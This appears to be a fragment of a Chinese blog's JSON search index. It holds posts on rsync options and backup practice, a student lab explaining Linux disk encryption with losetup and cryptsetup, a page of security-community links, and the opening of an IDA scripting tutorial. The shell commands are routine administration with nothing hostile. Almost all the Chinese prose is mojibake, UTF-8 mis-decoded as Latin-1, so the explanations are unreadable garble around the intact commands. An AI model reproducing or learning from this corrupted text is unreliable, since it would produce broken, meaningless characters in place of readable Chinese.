å¯¹ç¨€ç–æ–‡ä»¶è¿›è¡Œç‰¹æ®Šå¤„ç†ä»¥èŠ‚çœDSTçš„ç©ºé—´ã€‚ -n, --dry-runç°å®å“ªäº›æ–‡ä»¶å°†è¢«ä¼ è¾“ã€‚ -w, --whole-file æ‹·è´æ–‡ä»¶ï¼Œä¸è¿›è¡Œå¢é‡æ£€æµ‹ã€‚ -x, --one-file-system ä¸è¦è·¨è¶Šæ–‡ä»¶ç³»ç»Ÿè¾¹ç•Œã€‚ -B, --block-size=SIZE æ£€éªŒç®—æ³•ä½¿ç”¨çš„å—å°ºå¯¸ï¼Œé»˜è®¤æ˜¯700å­—èŠ‚ã€‚ -e, --rsh=command æŒ‡å®šä½¿ç”¨rshã€sshæ–¹å¼è¿›è¡Œæ•°æ®åŒæ­¥ã€‚ --rsync-path=PATH æŒ‡å®šè¿œç¨‹æœåŠ¡å™¨ä¸Šçš„rsyncå‘½ä»¤æ‰€åœ¨è·¯å¾„ä¿¡æ¯ã€‚ -C, --cvs-exclude ä½¿ç”¨å’ŒCVSä¸€æ ·çš„æ–¹æ³•è‡ªåŠ¨å¿½ç•¥æ–‡ä»¶ï¼Œç”¨æ¥æ’é™¤é‚£äº›ä¸å¸Œæœ›ä¼ è¾“çš„æ–‡ä»¶ã€‚ --existing ä»…ä»…æ›´æ–°é‚£äº›å·²ç»å­˜åœ¨äºDSTçš„æ–‡ä»¶ï¼Œè€Œä¸å¤‡ä»½é‚£äº›æ–°åˆ›å»ºçš„æ–‡ä»¶ã€‚ --delete åˆ é™¤é‚£äº›DSTä¸­SRCæ²¡æœ‰çš„æ–‡ä»¶ã€‚ --delete-excluded åŒæ ·åˆ é™¤æ¥æ”¶ç«¯é‚£äº›è¢«è¯¥é€‰é¡¹æŒ‡å®šæ’é™¤çš„æ–‡ä»¶ã€‚ --delete-after ä¼ è¾“ç»“æŸä»¥åå†åˆ é™¤ã€‚ --ignore-errors åŠæ—¶å‡ºç°IOé”™è¯¯ä¹Ÿè¿›è¡Œåˆ é™¤ã€‚ --max-delete=NUM æœ€å¤šåˆ é™¤NUMä¸ªæ–‡ä»¶ã€‚ --partial ä¿ç•™é‚£äº›å› æ•…æ²¡æœ‰å®Œå…¨ä¼ è¾“çš„æ–‡ä»¶ï¼Œä»¥æ˜¯åŠ å¿«éšåçš„å†æ¬¡ä¼ è¾“ã€‚ --force å¼ºåˆ¶åˆ é™¤ç›®å½•ï¼Œå³ä½¿ä¸ä¸ºç©ºã€‚ --numeric-ids ä¸å°†æ•°å­—çš„ç”¨æˆ·å’Œç»„idåŒ¹é…ä¸ºç”¨æˆ·åå’Œç»„åã€‚ --timeout=time ipè¶…æ—¶æ—¶é—´ï¼Œå•ä½ä¸ºç§’ã€‚ -I, --ignore-times ä¸è·³è¿‡é‚£äº›æœ‰åŒæ ·çš„æ—¶é—´å’Œé•¿åº¦çš„æ–‡ä»¶ã€‚ --size-only å½“å†³å®šæ˜¯å¦è¦å¤‡ä»½æ–‡ä»¶æ—¶ï¼Œä»…ä»…å¯Ÿçœ‹æ–‡ä»¶å¤§å°è€Œä¸è€ƒè™‘æ–‡ä»¶æ—¶é—´ã€‚ --modify-window=NUM å†³å®šæ–‡ä»¶æ˜¯å¦æ—¶é—´ç›¸åŒæ—¶ä½¿ç”¨çš„æ—¶é—´æˆ³çª—å£ï¼Œé»˜è®¤ä¸º0ã€‚ -T --temp-dir=DIR åœ¨DIRä¸­åˆ›å»ºä¸´æ—¶æ–‡ä»¶ã€‚ --compare-dest=DIR åŒæ ·æ¯”è¾ƒDIRä¸­çš„æ–‡ä»¶æ¥å†³å®šæ˜¯å¦éœ€è¦å¤‡ä»½ã€‚ -P ç­‰åŒäº --partialã€‚ --progress æ˜¾ç¤ºå¤‡ä»½è¿‡ç¨‹ã€‚ -z, --compress å¯¹å¤‡ä»½çš„æ–‡ä»¶åœ¨ä¼ è¾“æ—¶è¿›è¡Œå‹ç¼©å¤„ç†ã€‚ --exclude=PATTERN æŒ‡å®šæ’é™¤ä¸éœ€è¦ä¼ è¾“çš„æ–‡ä»¶æ¨¡å¼ã€‚ --include=PATTERN æŒ‡å®šä¸æ’é™¤è€Œéœ€è¦ä¼ è¾“çš„æ–‡ä»¶æ¨¡å¼ã€‚ --exclude-from=FILE æ’é™¤FILEä¸­æŒ‡å®šæ¨¡å¼çš„æ–‡ä»¶ã€‚ --include-from=FILE ä¸æ’é™¤FILEæŒ‡å®šæ¨¡å¼åŒ¹é…çš„æ–‡ä»¶ã€‚ --version æ‰“å°ç‰ˆæœ¬ä¿¡æ¯ã€‚ --address ç»‘å®šåˆ°ç‰¹å®šçš„åœ°å€ã€‚ --config=FILE æŒ‡å®šå…¶ä»–çš„é…ç½®æ–‡ä»¶ï¼Œä¸ä½¿ç”¨é»˜è®¤çš„rsyncd.confæ–‡ä»¶ã€‚ --port=PORT æŒ‡å®šå…¶ä»–çš„rsyncæœåŠ¡ç«¯å£ã€‚ --blocking-io å¯¹è¿œç¨‹shellä½¿ç”¨é˜»å¡IOã€‚ -stats ç»™å‡ºæŸäº›æ–‡ä»¶çš„ä¼ è¾“çŠ¶æ€ã€‚ --progress åœ¨ä¼ è¾“æ—¶ç°å®ä¼ è¾“è¿‡ç¨‹ã€‚ --log-format=formAT æŒ‡å®šæ—¥å¿—æ–‡ä»¶æ ¼å¼ã€‚ --password-file=FILE ä»FILEä¸­å¾—åˆ°å¯†ç ã€‚ --bwlimit=KBPS é™åˆ¶I/Oå¸¦å®½ï¼ŒKBytes per secondã€‚ -h, --help æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯ã€‚   æ¯”è¾ƒæ³¨æ„çš„æ˜¯è¿™äº›é€‰é¡¹ï¼š-eã€-vã€-rã€ -R ã€-p\n-aqzrtopg\nrsyncå¯ä»¥ä¾é rsyncåè®®æˆ–è€…sshåè®®é€šé“æ¥è¿›è¡Œå¤‡ä»½ï¼Œæœ¬è´¨ä¸Šæ˜¯å»ºç«‹èµ·ä¸€ä¸ªé€šé“è¿›è¡Œå¤‡ä»½\n0x02 å¤‡ä»½æŒ‡å—  Referenceï¼š\n  å¤‡ä»½çš„321åŸåˆ™  3ï¼šå­˜å‚¨ 3 ä»½å®Œæ•´æ–‡ä»¶ï¼Œä¸€ä»½åŸä»¶åŠ ä¸Šä¸¤ä»½æ‹·è´ã€‚ 2ï¼šå°†æ–‡ä»¶èµ·ç ä¿æŒåœ¨ä¸¤ç§ä¸åŒçš„ä»‹è´¨ä¸Šã€‚ 1ï¼šå°†ä¸€ä»½æ‹·è´ä¿å­˜åœ¨å¼‚åœ°ã€‚    ç„¶ååœ¨åšå¤‡ä»½æ—¶ï¼Œéœ€è¦å¯¹å¤‡ä»½æ–‡ä»¶çš„æ¯ä¸ªç›®å½•å†™ä¸ªReadmeï¼Œæ–¹ä¾¿è§£é‡Šå¦‚ä½•å¤‡ä»½ï¼Œå¦‚ä½•æ¢å¤\nç„¶åå†åšä¸ªæ€»ç›®å½•ï¼Œå°±å®Œç¾äº†\nä¸€ä¸ªå¤‡ä»½ç›®å½•ç¤ºä¾‹å¦‚ä¸‹ï¼ˆæ‘˜è‡ªå‚è€ƒé“¾æ¥ä¸­çš„å°‘æ•°æ´¾ï¼Œä¸ªäººæ­£åœ¨åˆ¶ä½œç›¸å…³çš„å¤‡ä»½ç›®å½•ï¼‰ï¼š\né‡è£…æŒ‡å— â”œâ”€â”€ ç›®å½•.md â”œâ”€â”€ Google Chrome æ‰©å±• â”‚ â”œâ”€â”€ å¦‚ä½•å¤‡ä»½.md â”‚ â”œâ”€â”€ Proxy SwitchyOmega.bak â”‚ â””â”€â”€ æ‰©å±•åˆ—è¡¨.md â”œâ”€â”€ æ¡Œé¢ç¨‹åº â”‚ â”œâ”€â”€ å¦‚ä½•å¤‡ä»½.md â”‚ â”œâ”€â”€ Bandizip â”‚ â”‚ â””â”€â”€ Bandizip Settings.reg â”‚ â”œâ”€â”€ Directory Opus â”‚ â”‚ â””â”€â”€ Opus Config.ocb â”‚ â”œâ”€â”€ DnsJumper â”‚ â”‚ â””â”€â”€ DnsJumper.ini â”‚ â”œâ”€â”€ Everything â”‚ â”‚ â””â”€â”€ Everything.ini â”‚ â”œâ”€â”€ Listary â”‚ â”‚ â””â”€â”€ Preferences.json â”‚ â”œâ”€â”€ Snipaste â”‚ â”‚ â””â”€â”€ config.ini â”‚ â””â”€â”€ VSCode â”‚ â”œâ”€â”€ æ‰©å±•åˆ—è¡¨.md â”‚ â”œâ”€â”€ é”®ä½ç»‘å®š.json â”‚ â”œâ”€â”€ å…¨å±€è®¾ç½®.json â”‚ â””â”€â”€ ä»£ç ç‰‡æ®µ â”‚ â”œâ”€â”€ c.json â”‚ â”œâ”€â”€ ... â”‚ â””â”€â”€ markdown.json â”œâ”€â”€ Linux å®‰è£…æŒ‡å— â”‚ â”œâ”€â”€ CentOS.md â”‚ â”œâ”€â”€ è½¯ä»¶åˆ—è¡¨.md â”‚ â””â”€â”€ WSL.md â”œâ”€â”€ Mac å®‰è£…æŒ‡å— â”‚ â”œâ”€â”€ å¦‚ä½•å¤‡ä»½.md â”‚ â”œâ”€â”€ brew bundle.md â”‚ â”œâ”€â”€ åº”ç”¨ç¨‹åº.md â”‚ â””â”€â”€ æ‰‹åŠ¨å®‰è£….md â”œâ”€â”€ æ‰‹æœºåº”ç”¨åˆ—è¡¨ â”‚ â”œâ”€â”€ å¦‚ä½•å¤‡ä»½.md â”‚ â”œâ”€â”€ Android.md â”‚ â””â”€â”€ iPhone.md â”œâ”€â”€ oh-my-zsh â”‚ â”œâ”€â”€ å¦‚ä½•å¤‡ä»½.md â”‚ â”œâ”€â”€ zshrc-mac.md â”‚ â”œâ”€â”€ zshrc-vps.md â”‚ â””â”€â”€ zshrc-wsl.md â””â”€â”€ Windows å®‰è£…æŒ‡å— â”œâ”€â”€ å¦‚ä½•å¤‡ä»½.md â”œâ”€â”€ ç¬¬ä¸€æ¬¡é…ç½®.md â””â”€â”€ è½¯ä»¶åˆ—è¡¨.md ","description":"","tags":[],"title":"Data Backup","uri":"/posts/data-backup/"},{"categories":[],"content":"About encrypting Linux file 0x00 åº åœ¨ä¸Šæ¬¡åšå®Œvhdxå®éªŒåï¼Œè€å¸ˆåˆè®©æˆ‘ä»¬åšäº†ä¸€æ¬¡æœ‰å…³linuxçš„æ–‡ä»¶åŠ å¯†çš„ç›¸å…³å®éªŒ\nä½†æ˜¯åœ¨åšå®éªŒæ—¶ï¼Œéƒ½æ˜¯ç›´æ¥ç…§æ•²å‘½ä»¤è¿è¡Œï¼Œåˆ°æœ€åçœ‹åˆ°lost+foundå°±ç®—æˆåŠŸäº†ï¼Œä½†æ˜¯ä½œä¸ºä¸€ä¸ªå­¦ä¹ è€…æˆ‘ä»¬ä¸èƒ½é…±ç´«\næˆ‘ä»¬è¿™æ¬¡æ¥çœ‹çœ‹è¿™äº›å‘½ä»¤åˆ°åº•æ˜¯åšä»€ä¹ˆçš„\n0x01 losetup/cryptoloop æ–¹æ³• åˆ›å»ºå‘½ä»¤å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10  $ dd if=/dev/zero of=bigf1 bs=1024000 count=0 seek=77 $ modprobe cryptoloop des aes $ losetup -e aes /dev/loop1 bigf1 $ # fdisk /dev/loop1 $ mkfs /dev/loop1 $ mkdir d1 $ mount /dev/loop1 d1 $ cd d1 $ ls     dd ï¼šddå‘½ä»¤ç”¨äºåˆ›å»ºä¸€ä¸ªå¤§æ–‡ä»¶ï¼Œç”¨æ¥å½“ä½œè™šæ‹Ÿç£ç›˜ï¼Œç›¸å½“äºwindowsçš„vhdxæ–‡ä»¶\n   Linux ddå‘½ä»¤\n   ç¬¬ä¸€æ¡å‘½ä»¤ï¼Œifè§„å®šè¾“å…¥æ–‡ä»¶åï¼Œå³æ ‡å‡†è¾“å…¥ï¼› ofè§„å®šè¾“å‡ºæ–‡ä»¶åï¼Œå³æ ‡å‡†è¾“å‡ºï¼›bsç”¨äºè®¾ç½®è¯»å…¥\u0026è¾“å‡ºçš„å—å¤§å°ï¼Œå•ä½ä¸º byte å­—èŠ‚ï¼›count è§„å®šæ‹·è´blockä¸ªå— ï¼›seek è§„å®šä»è¾“å‡ºæ–‡ä»¶å¼€å¤´è·³è¿‡blocksä¸ªå—ååœ¨å¼€å§‹å¤åˆ¶ï¼Œå¯¹åº”çš„è·³è¿‡è¾“å…¥æ–‡ä»¶çš„å‰nä¸ªå—çš„é€‰é¡¹ä¸ºskipã€‚\n  /dev/zero ï¼šå±äºlinuxä¸­çš„ç‰¹æ®Šè®¾å¤‡ï¼Œé›¶è®¾å¤‡ï¼Œå¯ä»¥æ— é™çš„æä¾›ç©ºå­—ç¬¦(0x00,ASCIIç ä¸ºNUL)ï¼Œå¸¸ç”¨æ¥ç”Ÿæˆä¸€ä¸ªç‰¹å®šå¤§å°çš„æ–‡ä»¶\n  æ‰€ä»¥è¿™æ¡å‘½ä»¤æ„äºåˆ›å»ºä¸€ä¸ªå¤§å°ä¸º1Gçš„å…¨ä¸º0çš„å¤§æ–‡ä»¶\n    ç±»ä¼¼çš„åˆ›å»ºå¤§æ–‡ä»¶å‘½ä»¤æœ‰ï¼š fallocate ã€ truncate\nfallocateï¼šåŠŸèƒ½æ˜¯ä¸ºæ–‡ä»¶é¢„åˆ†é…ç‰©ç†ç©ºé—´ï¼Œè€Œä¸æ˜¯ç”Ÿæˆä¸€ä¸ªç©ºæ´æ–‡ä»¶ï¼Œfallocateåˆ†é…çš„ç©ºé—´åœ¨ç£ç›˜çš„æ‰‡åŒºä¸Šæ˜¯è¿ç»­çš„ï¼Œå®ƒå‡å°‘åç»­å†™å…¥å’Œè¯»å–æ–‡ä»¶æ—¶çš„ç£ç›˜å¯»é“å¼€é”€ï¼›å¹¶ä¸”æ˜¯è¿…é€Ÿç›´æ¥å ç”¨ç©ºé—´ï¼Œè€Œä¸æ˜¯æƒ³ç©ºæ´æ–‡ä»¶é‚£æ ·â€œå‡è£…â€å æœ‰é‚£ä¹ˆå¤šç©ºé—´ï¼Œè¿™æ ·å°±å¯ä»¥ä¿è¯éšç€ç£ç›˜ç©ºé—´çš„ä½¿ç”¨ï¼Œè€Œä¸ä¼šå‡ºç°è¯¥æ®µç£ç›˜ç©ºé—´ä¸è¶³ã€‚ç”±äºfallocateå¹¶ä¸æ˜¯æ ‡å‡†çš„posixæ¥å£ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„æ–‡ä»¶ç³»ç»Ÿéƒ½æ˜¯æ”¯æŒçš„ï¼Œç›®å‰ä¸»æµçš„ext4å’Œxfséƒ½æ˜¯å¯ä»¥çš„ã€‚\ntruncateæ˜¯å°†æ–‡ä»¶çš„æœ«å°¾ä½ç½®â€œæ‰©å±•åˆ°â€ä¸€ä¸ªå›ºå®šä½ç½®è€Œç”Ÿæˆçš„ä¸€ä¸ªç©ºæ´æ–‡ä»¶ï¼Œä¹Ÿå³æ˜¯ç¨€ç–æ–‡ä»¶ã€‚è¯¥æ–‡ä»¶å¹¶ä¸å ç”¨å®é™…ç£ç›˜ç©ºé—´ï¼Œåªæ˜¯é€»è¾‘ä¸Šçœ‹èµ·æ¥é‚£ä¹ˆå¤§è€Œå·²ã€‚\n  modprobe ï¼šè¿™ä¸ªå‘½ä»¤åœ¨ä¹‹å‰å­¦ä¹ å†…æ ¸ç¼–ç¨‹æ—¶æœ‰æ¥è§¦è¿‡ï¼Œç”¨æ¥è‡ªåŠ¨åŠ è½½æ¨¡å—åŠå…¶ä¾èµ–ï¼Œç›¸å½“äºapt install è‡ªåŠ¨è£…åŒ…ï¼Œè¿™ä¸ªå°±æ˜¯è‡ªåŠ¨åŠ è½½æ¨¡å—è¿›å†…æ ¸\n è¿™è¾¹ç”¨äºåŠ è½½åé¢æ‰€ç”¨çš„åŠ å¯†æ¨¡å—    losetup å‘½ä»¤ï¼šå…³é”®ä¹‹å¤„æ¥äº†ï¼Œè¯¥å‘½ä»¤ç”¨äºè®¾ç½®å¾ªç¯è®¾å¤‡ã€‚å¾ªç¯è®¾å¤‡å¯æŠŠæ–‡ä»¶è™šæ‹ŸæˆåŒºå—è®¾å¤‡ï¼Œç±ä»¥æ¨¡æ‹Ÿæ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œè®©ç”¨æˆ·å¾—ä»¥å°†å…¶è§†ä¸ºç¡¬ç›˜é©±åŠ¨å™¨ï¼Œå…‰é©±æˆ–è½¯é©±ç­‰è®¾å¤‡ï¼Œå¹¶æŒ‚å…¥å½“ä½œç›®å½•æ¥ä½¿ç”¨ã€‚\n  1  $ losetup [-d][-e \u003cåŠ å¯†æ–¹å¼\u003e][-o \u003cå¹³ç§»æ•°ç›®\u003e][å¾ªç¯è®¾å¤‡ä»£å·][æ–‡ä»¶]     Linux losetupå‘½ä»¤\n  è¿™è¾¹æ˜¯å°†big1å¤§æ–‡ä»¶è™šæ‹Ÿæˆå—è®¾å¤‡/dev/loop1ï¼Œç„¶åä»¥aesçš„æ–¹æ³•åŠ å¯†\n  /dev/loop ï¼šloopè®¾å¤‡æ˜¯ä¸€ç§ä¼ªè®¾å¤‡ï¼Œæ˜¯ä½¿ç”¨æ–‡ä»¶æ¥æ¨¡æ‹Ÿå—è®¾å¤‡çš„ä¸€ç§æŠ€æœ¯ï¼Œæ–‡ä»¶æ¨¡æ‹Ÿæˆå—è®¾å¤‡å, å°±åƒä¸€ä¸ªç£ç›˜æˆ–å…‰ç›˜ä¸€æ ·ä½¿ç”¨ã€‚åœ¨ä½¿ç”¨ä¹‹å‰ï¼Œä¸€ä¸ª loop è®¾å¤‡å¿…é¡»è¦å’Œä¸€ä¸ªæ–‡ä»¶è¿›è¡Œè¿æ¥ã€‚è¿™ç§ç»“åˆæ–¹å¼ç»™ç”¨æˆ·æä¾›äº†ä¸€ä¸ªæ›¿ä»£å—ç‰¹æ®Šæ–‡ä»¶çš„æ¥å£ã€‚å› æ­¤ï¼Œå¦‚æœè¿™ä¸ªæ–‡ä»¶åŒ…å«æœ‰ä¸€ä¸ªå®Œæ•´çš„æ–‡ä»¶ç³»ç»Ÿï¼Œé‚£ä¹ˆè¿™ä¸ªæ–‡ä»¶å°±å¯ä»¥åƒä¸€ä¸ªç£ç›˜è®¾å¤‡ä¸€æ ·è¢« mount èµ·æ¥ã€‚ä¹‹æ‰€ä»¥å«loopè®¾å¤‡ï¼ˆå›ç¯ï¼‰ï¼Œå…¶å®æ˜¯ä»æ–‡ä»¶ç³»ç»Ÿè¿™ä¸€å±‚æ¥è€ƒè™‘çš„ï¼Œå› ä¸ºè¿™ç§è¢« mount èµ·æ¥çš„é•œåƒæ–‡ä»¶å®ƒæœ¬èº«ä¹ŸåŒ…å«æœ‰æ–‡ä»¶ç³»ç»Ÿï¼Œé€šè¿‡loopè®¾å¤‡æŠŠå®ƒmountèµ·æ¥ï¼Œå®ƒå°±åƒæ˜¯æ–‡ä»¶ç³»ç»Ÿä¹‹ä¸Šå†ç»•äº†ä¸€åœˆçš„æ–‡ä»¶ç³»ç»Ÿï¼Œæ‰€ä»¥ç§°ä¸º loopã€‚\n wiki - Loopè®¾å¤‡ å¸è½½ä¸€ä¸ªloopè®¾å¤‡ï¼šlosetup -d /dev/loop1 losetup -aæŸ¥çœ‹æ‰€æœ‰çš„loopè®¾å¤‡ï¼Œå¦‚æœå‘½ä»¤æ²¡æœ‰è¾“å‡ºå°±è¯´æ˜æ‰€æœ‰çš„loopè®¾å¤‡éƒ½æ²¡æœ‰è¢«å ç”¨ åˆ›å»ºloopè®¾å¤‡çš„å‘½ä»¤mknod -m 0660 /dev/loopX b 7 Xï¼šå‡å¦‚loopè®¾å¤‡å…¨æ»¡ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªå»ºä¸€ä¸ªæ–°çš„ï¼Œåˆæˆ–è€…æ‰‹è´±åˆ äº†(æ¯”å¦‚æˆ‘)ï¼Œç”¨è¿™ä¸ªä¹Ÿèƒ½åˆ›å»ºå›æ¥      mkfså‘½ä»¤ç”¨äºåœ¨ç‰¹å®šçš„åˆ†åŒºä¸Šå»ºç«‹ linux æ–‡ä»¶ç³»ç»Ÿ\n Linux mkfså‘½ä»¤ æ—¢ç„¶æˆ‘ä»¬éƒ½æŠŠå¤§æ–‡å°†big1å½“ä¸€ä¸ªè™šæ‹Ÿç£ç›˜ä¸€æ ·å’Œloopè®¾å¤‡å…³è”åœ¨ä¸€èµ·ï¼Œé‚£ä¹ˆç°åœ¨å°±æ˜¯æ¥åˆ¶ä½œè™šæ‹Ÿç£ç›˜çš„æ—¶å€™ï¼Œè¿™ä¸ªå‘½ä»¤åœ¨big1ä¸Šå»ºç«‹linuxæ–‡ä»¶ç³»ç»Ÿ    mkdir d1;mount /dev/loop1 d1;cd d1 ï¼š è¿™å‡ ä¸ªå‘½ä»¤ä¸€èµ·è®²äº†ï¼Œå°±æ˜¯åˆ›å»ºä¸ªæ–‡ä»¶å¤¹d1ï¼Œå¯ä»¥ä¾›åˆšæ‰çš„è™šæ‹Ÿç£ç›˜æŒ‚è½½ï¼Œç±»ä¼¼äºæ’å…¥uç›˜ç„¶åæŒ‚è½½åˆ°æœ¬åœ°ä¸€æ ·\n Linux mountå‘½ä»¤    å¸è½½è™šæ‹Ÿç£ç›˜ï¼Œè¿™ä¸ªä¹Ÿæ˜¯éå¸¸ç®€å•ï¼ŒæŒ‰ç€ä¸Šé¢çš„æ­¥éª¤é€†ç€å›å»å°±è¡Œäº†\n1 2 3 4 5  $ umount /dev/loop1 $ losetup -d /dev/loop1 $ rmmod cryptoloop des aes $ # rm -rf big1 d1 $   0x02 luks:cryptsetup/dm-cryptæ–¹æ³• åˆ›å»ºçš„å‘½ä»¤å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  $ apt install cryptsetup-bin $ modprobe aes # or desï¼Œtwofish etc $ modprobe dm-crypt $ lsmod | grep -E \"aes|dm\" $ ls /dev/mapper/control $ dmsetup targets # æŸ¥çœ‹targetsä¿¡æ¯ $ dd if=/dev/zero of=bf1 bs=1024000 count=500 conv=fdatasync $ losetup /dev/loop1 bf1 $ cryptsetup -c aes create efs1 /dev/loop1 $ dmsetup ls $ ls /dev/mapper/efs1 $ mkfs /dev/mapper/efs1 $ mkdir efs1 $ mount /dev/mapper/efs1 ./efs1 $ cd ./efs1 $ dd if=/dev/zero of=t1 bs=1024000 count=100 conv=fdatasync $ $ cd .. $ hexdump -C -x ./efs1 # çœ‹åˆ°ä¹±ç    é¦–å…ˆæ¥äº†è§£ä¸€ä¸‹ cryptsetup-bin ï¼Œè¿™ä¸ªåŒ…æä¾›äº†ä¸€ä¸ªæ¥å£ï¼Œè¯¥æ¥å£ä½¿ç”¨Linuxå†…æ ¸è®¾å¤‡æ˜ å°„å™¨å¯¹è±¡ dm-crypt å»åŠ å¯†å—è®¾å¤‡ï¼Œæ”¯æŒLinuxç»Ÿä¸€å¯†é’¥è®¾ç½®ï¼ˆLUKSï¼‰çš„åŠŸèƒ½ã€‚\n dm-crypt: a device-mapper crypto target\nDMCrypt  ï¼š wiki\nGitLab - Cryptsetup ï¼šé¡¹ç›®å®˜ç½‘\nLinuxå—è®¾å¤‡åŠ å¯†ä¹‹dm-cryptåˆ†æ ï¼šä¸€äº›æºç åˆ†æ\ndm-cryptâ€”â€”å¤šåŠŸèƒ½ Linux ç£ç›˜åŠ å¯†å·¥å…· ï¼šä½¿ç”¨æ–¹æ³•ä»‹ç»\nä½¿ç”¨cryptsetupåˆ›å»ºåŠ å¯†ç£ç›˜\n dm-crypt ï¼šè‡ªä»Linux Kernel 2.6 çš„æ—©æœŸç‰ˆæœ¬ï¼Œè¢«æ•´åˆåˆ°å†…æ ¸ä¸­\næ”¯æŒä»¥ä¸‹é›†ä¸­åŠ å¯†æ ¼å¼\n LUKSï¼šdm-crypt æœ€å¸¸ç”¨çš„ä¸€ä¸ªæ¨¡å¼ Plainï¼šåŸå§‹çš„dm-cryptæ ¼å¼ Loop-AES ï¼šæ¯”è¾ƒé™ˆæ—§çš„Linuxç£ç›˜åŠ å¯†å·¥å…· TCRYPTï¼šTrueCryptçš„ç¼©å†™ï¼Œè¿™ä¸ªè€å¸ˆä¸Šè¯¾ä»‹ç»è¿‡ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªåŠ å¯†å·¥å…·     å¯ä»¥é€šè¿‡ uname -aï¼šå¯ä»¥æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬\n  ç„¶åä»è¿™é‡Œï¼ˆLinux å®˜ç½‘ï¼‰ä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„linuxæºç \n  åœ¨kernel_path/drivers/md/dm-crypt.cæ‹¿å‡ºæºç \n  ç„¶åå‚è€ƒè¿™ä¸ªç›®å½•ä¸‹çš„Makefileï¼Œå½“ç„¶ä¹Ÿå¯ä»¥é€šç”¨çš„ç”¨å†…æ ¸ç¼–è¯‘çš„Makefileï¼Œæ¯”å¦‚æˆ‘çš„åšå®¢é‡Œçš„è¿™é‡Œé¢çš„Makefileï¼Œç¨åŠ ä¿®æ”¹å°±å¯ä»¥ç¼–è¯‘å¾—åˆ°.koçš„å†…æ ¸æ¨¡å—æ‰§è¡Œæ–‡ä»¶\nP.S. ä¹Ÿå¯ä»¥å»ç¼–è¯‘æ•´ä¸ªå†…æ ¸æºç ï¼Œç„¶ååœ¨å¯¹åº”æ–‡ä»¶å¤¹æ‰¾åˆ°å¯¹åº”çš„.koæ–‡ä»¶ï¼Œè¿›è¡Œå†…æ ¸æ¨¡å—åŠ è½½\n     /dev/mapper/control\n Linux å†…æ ¸ä¸­çš„ Device Mapper æœºåˆ¶ Linuxç³»ç»Ÿ/dev/mapperç›®å½•æµ…è°ˆ Linux å†…æ ¸ä¸­çš„ Device Mapper æœºåˆ¶ ï¼šIBMçš„å†…æ ¸æœºåˆ¶è®²è§£    dmsetup å‘½ä»¤ï¼šè¯¥å‘½ä»¤ç”¨äºæŸ¥çœ‹Device Mapperç›¸å…³çš„è®¾å¤‡æ¦‚è¿°ï¼Œè‹¥æ— æŒ‡å®šè®¾å¤‡åç§°ï¼Œåˆ™è¾“å‡ºæ‰€æœ‰çš„Device Mapperè®¾å¤‡ä¿¡æ¯\n   DMSETUP å‘½ä»¤\n     è¿™ä¸€äº›åˆ—å‘½ä»¤çš„æ“ä½œå¤§å¤šå’Œç¬¬ä¸€ç§æ–¹æ³•ç›¸ä¼¼ï¼Œåªæ˜¯æ¢äº†ä¸€ç§å·¥å…·ç½¢äº†\nå¸è½½çš„å‘½ä»¤å¦‚ä¸‹\n1 2 3 4 5 6 7  $ cd .. $ umount /dev/mapper/efs1 $ cryptsetup remove efs1 $ dmsetup ls # now nothing left $ losetup -d /dev/loop1 $ rmmod dm-crypt   ","description":"About Linux security storage","tags":[],"title":"Security Storage","uri":"/posts/security-storage/"},{"categories":null,"content":"For Some userful link åŸæœ¬æƒ³è¦åšä¸€ä¸ªç±»ä¼¼äºå¯¼èˆªé¡µé¢çš„ç½‘ç«™ï¼Œä½†æ˜¯çœ‹äº†è®¸å¤šé¡¹ç›®ï¼Œéƒ½ä¸èƒ½è®©æˆ‘æ»¡æ„\næ•…å…ˆæš‚æ—¶å°†é“¾æ¥å­˜æ­¤\n Common é»‘å®¢ç²¾ç¥ï¼šhttp://catb.org/~esr/faqs/hacker-howto.html\nÂ Â GitHub  Â Â Linux source code: By Bootlin :é¡¹ç›®åœ°å€  Â Â IconFont: é˜¿é‡Œå·´å·´çŸ¢é‡å›¾åº“  Â Â å®‰å…¨åœˆinfo:ä¿¡æ¯å®‰å…¨å¯¼èˆª  Â Â Paper  Â Â çœ‹é›ªè®ºå›  Â Â Sec-Wiki  Â Â å…ˆçŸ¥ç¤¾åŒº  Â Â å®‰å…¨å®¢  Â Â FreeBuf  Â Â çŸ¥é“åˆ›å®‡-åšå®¢  Â Â å¾çˆ±ç ´è§£  Â Â Wooyun Mirror :Mirror Code \u0026 http://wy.zone.ci/  Â Â Blog of BUUCTF's dalao's : some blog  Â Â ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦ Linux ç”¨æˆ·åä¼š  Â Â Segment Fault  https://navisec.it/\nhttps://bingoyyy.gitee.io/website-navigation/\nhttp://skills.bugbank.cn/\nhttps://www.ddosi.com/\nhttps://www.ctftools.com/down/\n https://www.hackerone.com/\n fmyy.pro\npwnki\n0xpat\nhttps://veteransec.com/\nhttps://www.offensive-security.com/\n Links To Everything    å›½å†…å®‰å…¨å›¢é˜Ÿ   å›½å¤–å®‰å…¨å›¢é˜Ÿ   é«˜æ ¡å®‰å…¨ç ”ç©¶å®éªŒå®¤   ","description":"","tags":null,"title":"Link","uri":"/link/"},{"categories":["reverse"],"content":"IDA è„šæœ¬å…¥é—¨ æ€»æ‰€çš†çŸ¥ï¼ŒIDAæ˜¯ä¸€ä¸ªéå¸¸å¥½ç”¨çš„é€†å‘é™æ€åˆ†æå·¥å…·ï¼Œä¸ŠèŠ‚è¯¾ï¼Œè€å¸ˆå¸¦æˆ‘ä»¬ä½“éªŒåˆ°äº†idaè„šæœ¬çš„é­…åŠ›ï¼Œæˆ‘ä»¬è¿™æ¬¡å°±æ¥äº†è§£ä¸€æ³¢IDAçš„è„šæœ¬\n Reference:\nIDA Pro è„šæœ¬ç³»ç»Ÿ(idc idaPython)å¸®åŠ©æ–‡æ¡£ç´¢å¼•\n2018-07-14 IDA-è„šæœ¬ç¼–å†™\nidc\nIDA Help: Alphabetical list of IDC functions\n[ç¿»è¯‘][åŸåˆ›]IDCè„šæœ¬ - 